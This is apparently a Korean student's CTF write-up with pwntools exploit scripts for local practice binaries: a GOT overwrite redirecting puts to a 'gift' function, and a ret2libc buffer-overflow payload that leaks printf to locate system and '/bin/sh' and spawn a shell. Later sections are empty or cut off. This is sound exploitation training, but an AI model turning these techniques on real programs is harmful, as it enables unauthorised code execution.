# rop


## problem 1

GOT Overwrite를 하는 문제이다. 포인터를 통해 puts의 GOT를 gift의 주소로 변경하면 puts함수를 실행할 때 gift로 점프해 실행하도록 만들 수 있다. gdb를 통해 디버깅하여 puts의 GOT와 gift함수의 주소를 알 수 있다. 

```python
from pwn import *

p = process('./got_overwrite')

puts_got = 0x404018
gift = 0x4011d6

p.recvuntil(b"addr: ")
p.sendline(str(puts_got))
p.recvuntil(b"value: ")
p.sendline(str(gift))

p.interactive()
```


## problem 3

ROP 문제로, 주어진 printf 함수의 실제 주소를 활용하여 system과 '/bin/sh'의 주소를 찾을 수 있다.

```python

from pwn import *

p = process('./onegadget')
e = ELF('./onegadget')
libc = e.libc

p.recvuntil(b'printf Function is at: ')
printf_addr = int(p.recv(14), 16)

libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

log.info("libc base : %s"%hex(libc_base))
log.info("system addr : %s"%hex(system_addr))

payload = b'A'*0x20
payload += b'B'*0x8
payload += p64(system_addr)
payload += b'C'*0x8
payload += p64(binsh)

p.sendline(payload)

p.interactive()


```



## problem 3-2

마찬가지로 ROP 문제이다. read를 활용하여 


## problem 4




## problem 5




## problem 6






